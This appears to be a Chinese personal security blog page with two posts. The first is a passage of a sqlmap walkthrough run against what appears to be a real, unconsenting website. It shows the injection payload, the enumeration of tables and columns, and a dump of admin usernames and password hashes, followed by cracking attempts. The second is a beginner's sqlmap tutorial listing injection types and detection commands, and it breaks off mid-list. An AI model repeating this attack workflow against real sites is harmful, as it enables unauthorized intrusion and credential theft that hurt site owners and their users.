|    web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727       |
|    back-end DBMS: Microsoft Access                                                 |
 ------------------------------------------------------------------------------------
[10:37:53] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 67 times
[10:37:53] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;

[*] shutting down at 10:37:53
</code></pre></li>
</ul>
<pre><code>#### 如果有漏洞会返回数据库相关信息
</code></pre><ul>
<li><p>2.猜解表名</p>
<pre><code>sqlmap -u &quot;网址&quot; --tables

root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --tables
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201707310a89}
|_ -| . | |     | .&apos;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:41:45

[10:41:45] [INFO] resuming back-end DBMS &apos;microsoft access&apos; 
[10:41:47] [INFO] testing connection to the target URL
[10:41:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ID (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ID=3239 AND 1305=1305
---
[10:41:52] [INFO] the back-end DBMS is Microsoft Access
web server operating system: Windows 2003 or XP
web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
back-end DBMS: Microsoft Access
[10:41:52] [INFO] fetching tables for database: &apos;Microsoft_Access_masterdb&apos;
[10:41:52] [INFO] fetching number of tables for database &apos;Microsoft_Access_masterdb&apos;
[10:41:52] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval
[10:41:52] [INFO] retrieved: 
[10:41:53] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; 
[10:41:53] [WARNING] unable to retrieve the number of tables for database &apos;Microsoft_Access_masterdb&apos;
[10:41:53] [ERROR] cannot retrieve table names, back-end DBMS is Access

do you want to use common table existence check? [Y/n/q] y   //   此处默认选y

[10:41:59] [INFO] checking table existence using items from &apos;/usr/share/sqlmap/txt/common-tables.txt&apos;
[10:41:59] [INFO] adding words used on web page to the check list

please enter number of threads? [Enter for 1 (current)] 10     //    线程设置为10即可

[10:42:06] [INFO] starting 10 threads
[10:42:12] [INFO] retrieved: admin                                                                                                         
[10:42:13] [INFO] retrieved: news                                                                                                          
[10:42:38] [INFO] retrieved: ads                                                                                                           

Database: Microsoft_Access_masterdb
[3 tables]
+-------+
| admin |
| ads   |
| news  |
+-------+

[10:45:43] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3144 times
[10:45:43] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;

[*] shutting down at 10:45:43
</code></pre><h4 id="根据经验确定用户名（username，password）"><a href="#根据经验确定用户名（username，password）" class="headerlink" title="根据经验确定用户名（username，password）"></a>根据经验确定用户名（username，password）</h4></li>
<li><p>3.猜解列名（字段）</p>
<pre><code>sqlmap -u &quot;网址&quot; --columns -T &quot;表名（上一步确定的）&quot;
</code></pre></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --columns -T &quot;admin&quot;</span><br><span class="line">         _</span><br><span class="line"> ___ ___| |_____ ___ ___  &#123;1.0-dev-nongit-201707310a89&#125;</span><br><span class="line">|_ -| . | |     | .&apos;| . |</span><br><span class="line">|___|_  |_|_|_|_|__,|  _|</span><br><span class="line">      |_|           |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 11:07:47</span><br><span class="line"></span><br><span class="line">[11:07:48] [INFO] resuming back-end DBMS &apos;microsoft access&apos; </span><br><span class="line">[11:07:48] [INFO] testing connection to the target URL</span><br><span class="line">[11:07:50] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: ID (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: ID=3239 AND 1305=1305</span><br><span class="line">---</span><br><span class="line">[11:07:53] [INFO] the back-end DBMS is Microsoft Access</span><br><span class="line">web server operating system: Windows 2003 or XP</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: Microsoft Access</span><br><span class="line">[11:07:53] [ERROR] cannot retrieve column names, back-end DBMS is Access</span><br><span class="line">do you want to use common column existence check? [Y/n/q] y</span><br><span class="line">[11:08:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; </span><br><span class="line">[11:08:00] [INFO] checking column existence using items from &apos;/usr/share/sqlmap/txt/common-columns.txt&apos;</span><br><span class="line">[11:08:00] [INFO] adding words used on web page to the check list</span><br><span class="line">please enter number of threads? [Enter for 1 (current)] 20</span><br><span class="line">[11:08:02] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issues</span><br><span class="line">please enter number of threads? [Enter for 1 (current)] 10</span><br><span class="line">[11:08:05] [INFO] starting 10 threads</span><br><span class="line">[11:08:07] [INFO] retrieved: id                                                                                                            </span><br><span class="line">[11:08:09] [INFO] retrieved: username                                                                                                      </span><br><span class="line">[11:08:19] [INFO] retrieved: password                                                                                                      </span><br><span class="line">[11:08:36] [INFO] retrieved: department                                                                                                    </span><br><span class="line">[11:10:51] [INFO] retrieved: classid                                                                                                       </span><br><span class="line">                                                                                                                                           </span><br><span class="line">Database: Microsoft_Access_masterdb</span><br><span class="line">Table: admin</span><br><span class="line">[5 columns]</span><br><span class="line">+------------+-------------+</span><br><span class="line">| Column     | Type        |</span><br><span class="line">+------------+-------------+</span><br><span class="line">| classid    | numeric     |</span><br><span class="line">| department | non-numeric |</span><br><span class="line">| id         | numeric     |</span><br><span class="line">| password   | non-numeric |</span><br><span class="line">| username   | non-numeric |</span><br><span class="line">+------------+-------------+</span><br><span class="line"></span><br><span class="line">[11:11:11] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2499 times</span><br><span class="line">[11:11:11] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/40.cavtc.cn&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 11:11:11</span><br></pre></td></tr></table></figure>
<pre><code>#### --columns  猜列名 根据表  “表名”
#### 一般会出现username，那么密码字段一定是password
</code></pre><ul>
<li><p>4.下载数据</p>
<pre><code>sqlmap -u &quot;网址&quot; --dump -C &quot;username,password&quot; -T &quot;user&quot;
</code></pre></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot; --dump -C &quot;username,password&quot;</span><br><span class="line">         _</span><br><span class="line"> ___ ___| |_____ ___ ___  &#123;1.0-dev-nongit-201707310a89&#125;</span><br><span class="line">|_ -| . | |     | .&apos;| . |</span><br><span class="line">|___|_  |_|_|_|_|__,|  _|</span><br><span class="line">      |_|           |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 11:13:17</span><br><span class="line"></span><br><span class="line">[11:13:17] [INFO] resuming back-end DBMS &apos;microsoft access&apos; </span><br><span class="line">[11:13:17] [INFO] testing connection to the target URL</span><br><span class="line">[11:13:19] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: ID (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: ID=3239 AND 1305=1305</span><br><span class="line">---</span><br><span class="line">[11:13:22] [INFO] the back-end DBMS is Microsoft Access</span><br><span class="line">web server operating system: Windows 2003 or XP</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: Microsoft Access</span><br><span class="line">[11:13:22] [INFO] fetching tables for database: &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:22] [INFO] fetching number of tables for database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:22] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval</span><br><span class="line">[11:13:22] [INFO] retrieved: </span><br><span class="line">[11:13:24] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &apos;--no-cast&apos; </span><br><span class="line">[11:13:24] [WARNING] unable to retrieve the number of tables for database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:24] [ERROR] cannot retrieve table names, back-end DBMS is Access</span><br><span class="line">[11:13:24] [ERROR] cannot retrieve column names, back-end DBMS is Access</span><br><span class="line">[11:13:24] [INFO] fetching entries of column(s) &apos;classid, department, id, password, username&apos; for table &apos;admin&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:24] [INFO] fetching number of column(s) &apos;classid, department, id, password, username&apos; entries for table &apos;admin&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:13:24] [INFO] retrieved: 2</span><br><span class="line">[11:13:31] [INFO] fetching number of distinct values for column &apos;id&apos;</span><br><span class="line">[11:13:31] [INFO] retrieved: 2</span><br><span class="line">[11:13:38] [INFO] using column &apos;id&apos; as a pivot for retrieving row data</span><br><span class="line">[11:13:38] [INFO] retrieved: 19</span><br><span class="line">[11:13:58] [INFO] retrieved: 1</span><br><span class="line">[11:14:08] [INFO] retrieved: 47CC749B63858A2CE72379B371ECFE33</span><br><span class="line">[11:19:28] [INFO] retrieved: admin</span><br><span class="line">[11:20:42] [INFO] retrieved: </span><br><span class="line">[11:21:58] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)</span><br><span class="line"> Q~\xdc</span><br><span class="line">[11:24:50] [INFO] retrieved: 25</span><br><span class="line">[11:25:14] [INFO] retrieved: 2</span><br><span class="line">[11:25:28] [INFO] retrieved: 93EA4D217C79428D</span><br><span class="line">[11:28:17] [INFO] retrieved: xqb</span><br><span class="line">[11:28:56] [INFO] retrieved:  Q~\xdc</span><br><span class="line">[11:31:29] [INFO] analyzing table dump for possible password hashes</span><br><span class="line">[11:31:29] [INFO] recognized possible password hashes in column &apos;password&apos;</span><br><span class="line">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span><br><span class="line">[11:31:43] [INFO] writing hashes to a temporary file &apos;/tmp/sqlmap1qoJgX17098/sqlmaphashes-NipaiC.txt&apos; </span><br><span class="line">do you want to crack them via a dictionary-based attack? [Y/n/q] y</span><br><span class="line">[11:31:51] [INFO] using hash method &apos;md5_generic_passwd&apos;</span><br><span class="line">[11:31:51] [INFO] using hash method &apos;mysql_old_passwd&apos;</span><br><span class="line">what dictionary do you want to use?</span><br><span class="line">[1] default dictionary file &apos;/usr/share/sqlmap/txt/wordlist.zip&apos; (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line">&gt; 1</span><br><span class="line">[11:32:01] [INFO] using default dictionary</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] y</span><br><span class="line">[11:32:11] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[11:32:11] [INFO] starting 4 processes </span><br><span class="line">[11:32:20] [INFO] using suffix &apos;1&apos;                                                                                                         </span><br><span class="line">[11:32:30] [INFO] using suffix &apos;123&apos;                                                                                                       </span><br><span class="line">[11:32:40] [INFO] using suffix &apos;2&apos;                                                                                                         </span><br><span class="line">[11:32:49] [INFO] using suffix &apos;12&apos;                                                                                                        </span><br><span class="line">[11:32:59] [INFO] using suffix &apos;3&apos;                                                                                                         </span><br><span class="line">[11:33:08] [INFO] using suffix &apos;13&apos;                                                                                                        </span><br><span class="line">[11:33:18] [INFO] using suffix &apos;7&apos;                                                                                                         </span><br><span class="line">[11:33:28] [INFO] using suffix &apos;11&apos;                                                                                                        </span><br><span class="line">[11:33:38] [INFO] using suffix &apos;5&apos;                                                                                                         </span><br><span class="line">[11:33:47] [INFO] using suffix &apos;22&apos;                                                                                                        </span><br><span class="line">[11:33:57] [INFO] using suffix &apos;23&apos;                                                                                                        </span><br><span class="line">[11:34:06] [INFO] using suffix &apos;01&apos;                                                                                                        </span><br><span class="line">[11:34:16] [INFO] using suffix &apos;4&apos;                                                                                                         </span><br><span class="line">[11:34:26] [INFO] using suffix &apos;07&apos;                                                                                                        </span><br><span class="line">[11:34:36] [INFO] using suffix &apos;21&apos;                                                                                                        </span><br><span class="line">[11:34:46] [INFO] using suffix &apos;14&apos;                                                                                                        </span><br><span class="line">[11:34:55] [INFO] using suffix &apos;10&apos;                                                                                                        </span><br><span class="line">[11:35:05] [INFO] using suffix &apos;06&apos;                                                                                                        </span><br><span class="line">[11:35:14] [INFO] using suffix &apos;08&apos;                                                                                                        </span><br><span class="line">[11:35:24] [INFO] using suffix &apos;8&apos;                                                                                                         </span><br><span class="line">[11:35:34] [INFO] using suffix &apos;15&apos;                                                                                                        </span><br><span class="line">[11:35:44] [INFO] using suffix &apos;69&apos;                                                                                                        </span><br><span class="line">[11:35:54] [INFO] using suffix &apos;16&apos;                                                                                                        </span><br><span class="line">[11:36:03] [INFO] using suffix &apos;6&apos;                                                                                                         </span><br><span class="line">[11:36:13] [INFO] using suffix &apos;18&apos;                                                                                                        </span><br><span class="line">[11:36:22] [INFO] using suffix &apos;!&apos;                                                                                                         </span><br><span class="line">[11:36:32] [INFO] using suffix &apos;.&apos;                                                                                                         </span><br><span class="line">[11:36:43] [INFO] using suffix &apos;*&apos;                                                                                                         </span><br><span class="line">[11:36:52] [INFO] using suffix &apos;!!&apos;                                                                                                        </span><br><span class="line">[11:37:02] [INFO] using suffix &apos;?&apos;                                                                                                         </span><br><span class="line">[11:37:13] [INFO] using suffix &apos;;&apos;                                                                                                         </span><br><span class="line">[11:37:23] [INFO] using suffix &apos;..&apos;                                                                                                        </span><br><span class="line">[11:37:33] [INFO] using suffix &apos;!!!&apos;                                                                                                       </span><br><span class="line">[11:37:43] [INFO] using suffix &apos;, &apos;                                                                                                        </span><br><span class="line">[11:37:53] [INFO] using suffix &apos;@&apos;                                                                                                         </span><br><span class="line">[11:38:03] [INFO] starting dictionary-based cracking (mysql_old_passwd)                                                                    </span><br><span class="line">[11:38:18] [INFO] using suffix &apos;1&apos;                                                                                                         </span><br><span class="line">[11:38:35] [INFO] using suffix &apos;123&apos;                                                                                                       </span><br><span class="line">[11:38:51] [INFO] using suffix &apos;2&apos;                                                                                                         </span><br><span class="line">[11:39:07] [INFO] using suffix &apos;12&apos;                                                                                                        </span><br><span class="line">[11:39:23] [INFO] using suffix &apos;3&apos;                                                                                                         </span><br><span class="line">[11:39:38] [INFO] using suffix &apos;13&apos;                                                                                                        </span><br><span class="line">[11:39:54] [INFO] using suffix &apos;7&apos;                                                                                                         </span><br><span class="line">[11:40:10] [INFO] using suffix &apos;11&apos;                                                                                                        </span><br><span class="line">[11:40:26] [INFO] using suffix &apos;5&apos;                                                                                                         </span><br><span class="line">[11:40:41] [INFO] using suffix &apos;22&apos;                                                                                                        </span><br><span class="line">[11:41:03] [INFO] using suffix &apos;23&apos;                                                                                                        </span><br><span class="line">[11:41:24] [INFO] using suffix &apos;01&apos;                                                                                                        </span><br><span class="line">[11:41:46] [INFO] using suffix &apos;4&apos;                                                                                                         </span><br><span class="line">[11:42:07] [INFO] using suffix &apos;07&apos;                                                                                                        </span><br><span class="line">[11:42:30] [INFO] using suffix &apos;21&apos;                                                                                                        </span><br><span class="line">[11:42:52] [INFO] using suffix &apos;14&apos;                                                                                                        </span><br><span class="line">[11:43:10] [INFO] using suffix &apos;10&apos;                                                                                                        </span><br><span class="line">[11:43:32] [INFO] using suffix &apos;06&apos;                                                                                                        </span><br><span class="line">[11:43:51] [INFO] using suffix &apos;08&apos;                                                                                                        </span><br><span class="line">[11:44:07] [INFO] using suffix &apos;8&apos;                                                                                                         </span><br><span class="line">[11:44:22] [INFO] using suffix &apos;15&apos;                                                                                                        </span><br><span class="line">[11:44:37] [INFO] using suffix &apos;69&apos;                                                                                                        </span><br><span class="line">[11:44:53] [INFO] using suffix &apos;16&apos;                                                                                                        </span><br><span class="line">[11:45:10] [INFO] using suffix &apos;6&apos;                                                                                                         </span><br><span class="line">[11:45:31] [INFO] using suffix &apos;18&apos;                                                                                                        </span><br><span class="line">[11:45:56] [INFO] using suffix &apos;!&apos;                                                                                                         </span><br><span class="line">[11:46:21] [INFO] using suffix &apos;.&apos;                                                                                                         </span><br><span class="line">[11:46:46] [INFO] using suffix &apos;*&apos;                                                                                                         </span><br><span class="line">[11:47:10] [INFO] using suffix &apos;!!&apos;                                                                                                        </span><br><span class="line">[11:47:32] [INFO] using suffix &apos;?&apos;                                                                                                         </span><br><span class="line">[11:47:54] [INFO] using suffix &apos;;&apos;                                                                                                         </span><br><span class="line">[11:48:14] [INFO] using suffix &apos;..&apos;                                                                                                        </span><br><span class="line">[11:48:35] [INFO] using suffix &apos;!!!&apos;                                                                                                       </span><br><span class="line">[11:48:58] [INFO] using suffix &apos;, &apos;                                                                                                        </span><br><span class="line">[11:49:18] [INFO] using suffix &apos;@&apos;                                                                                                         </span><br><span class="line">[11:49:36] [WARNING] no clear password(s) found                                                                                            </span><br><span class="line">[11:49:36] [INFO] postprocessing table dump</span><br><span class="line">Database: Microsoft_Access_masterdb</span><br><span class="line">Table: admin</span><br><span class="line">[2 entries]</span><br><span class="line">+----+---------+----------+------------+----------------------------------+</span><br><span class="line">| id | classid | username | department | password                         |</span><br><span class="line">+----+---------+----------+------------+----------------------------------+</span><br><span class="line">| 19 | 1       | admin    | \x7fQ~\xdc | 47CC749B63858A2CE72379B371ECFE33 |</span><br><span class="line">| 25 | 2       | xqb      | \x7fQ~\xdc | 93EA4D217C79428D                 |</span><br><span class="line">+----+---------+----------+------------+----------------------------------+</span><br><span class="line"></span><br><span class="line">[11:49:36] [INFO] table &apos;Microsoft_Access_masterdb.admin&apos; dumped to CSV file &apos;/root/.sqlmap/output/40.cavtc.cn/dump/Microsoft_Access_masterdb/admin.csv&apos;</span><br><span class="line">[11:49:36] [ERROR] cannot retrieve column names, back-end DBMS is Access</span><br><span class="line">[11:49:36] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;news&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:49:36] [INFO] fetching number of column(s) &apos;password, username&apos; entries for table &apos;news&apos; in database &apos;Microsoft_Access_masterdb&apos;</span><br><span class="line">[11:49:36] [INFO] retrieved: 127</span><br><span class="line">[11:49:56] [INFO] fetching number of distinct values for column &apos;password&apos;</span><br><span class="line">[11:49:56] [INFO] retrieved: </span><br><span class="line">[11:49:57] [INFO] fetching number of distinct values for column &apos;username&apos;</span><br><span class="line">[11:49:57] [INFO] retrieved: </span><br><span class="line">[11:49:58] [CRITICAL] all column name(s) provided are non-existent</span><br><span class="line">[11:49:58] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 74 times</span><br><span class="line"></span><br><span class="line">[*] shutting down at 11:49:58</span><br></pre></td></tr></table></figure>
<pre><code>#### --dump  下载数据
#### -C &quot;username,password&quot; -T &quot;列名&quot; （&apos;,&apos;是一种多列显示的方法）
</code></pre><ul>
<li>5.成功获得用户名与密码(cmd5解密)</li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/SQLAMP入门/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/SQLAMP入门/" class="post-title-link" itemprop="url">SQLAMP入门</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:15:56 / 修改时间：06:16:38" itemprop="dateCreated datePublished" datetime="2019-01-14T06:15:56+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="SQLAMP入门"><a href="#SQLAMP入门" class="headerlink" title="SQLAMP入门"></a>SQLAMP入门</h1></blockquote>
<ul>
<li>1.什么是sqlmap<ul>
<li>sqlmap是一款命令行界面的开源的渗透测试工具（自动化的SQL注入）</li>
<li>sqlmap可以自动化的侦测和实施SQL注入攻击及渗透数据库服务器</li>
<li>sqlmap有强大的侦测引擎，可以获取不同数据库的指纹信息、数据，能够处理潜在的文件系统及通过数据连接执行系统命令</li>
</ul>
</li>
<li><p>2.sqlmap功能作用</p>
<ul>
<li>sqlmap目前支持My是SQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase和SAP MaxDB等数据库类型，采用五种独特的数据库注入方式<ul>
<li>基于bool的盲注，即可以根据返回页面判断条件真假的注入</li>
<li>基于time的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间内延迟</li>
<li>语句是否执行来判断（即页面返回时间是否增加）</li>
<li>基于error注入，即页面会返回错误信息，或者注入的语句的结果直接返回在页面中</li>
<li>联合查询union注入，可以使用union的情况下注入</li>
<li>堆查询注入，可以同时执行多条语句的注入</li>
</ul>
</li>
</ul>
</li>
<li><p>3.sqlmap安装环境</p>
<ul>
<li>一个kali就搞定</li>
<li>其他环境安装（百度）<ul>
<li>1.先准备好Python2.7环境</li>
<li>2.sqlmap安装包</li>
</ul>
</li>
</ul>
</li>
<li><p>4.三种请求类型的注入探测</p>
<ul>
<li><p>GET方式 的SQL注入检测</p>
<pre><code>sqlmap.py -u &quot;URL&quot;
</code></pre></li>
<li><p>POST方式的SQL注入检测（火狐浏览器安装插件hackbar抓到包之后可以看到POST数据）</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --data &quot;POST数据&quot;
</code></pre></li>
<li><p>Cookie方式的SQL注入检测（火狐浏览器安装插件firebug，首先要使用该插件创建一个Cookie，Cookie的值为Cookie数据）</p>
<pre><code>sqlmap.py -u --cookie &quot;Cookie数据&quot;
</code></pre></li>
</ul>
</li>
<li><p>4 获取数据库相关信息</p>
<ul>
<li><p>获取数据库的数据库类型以及版本</p>
<ul>
<li>数据库类型及版本<ul>
<li>Microsoft SQL Server</li>
<li>Mysql</li>
<li>Orcle</li>
<li>PostgreSQL</li>
</ul>
</li>
<li><p>如何查看类型及版本</p>
<pre><code>sqlmap.py -u &quot;URL&quot;
</code></pre></li>
</ul>
</li>
<li><p>获取当前网站所使用的数据库名与用户名</p>
<ul>
<li>两种常见的数据库结构（两种数据存储结构不同）<ul>
<li>Microsoft Access（库：表1，表2，表3）</li>
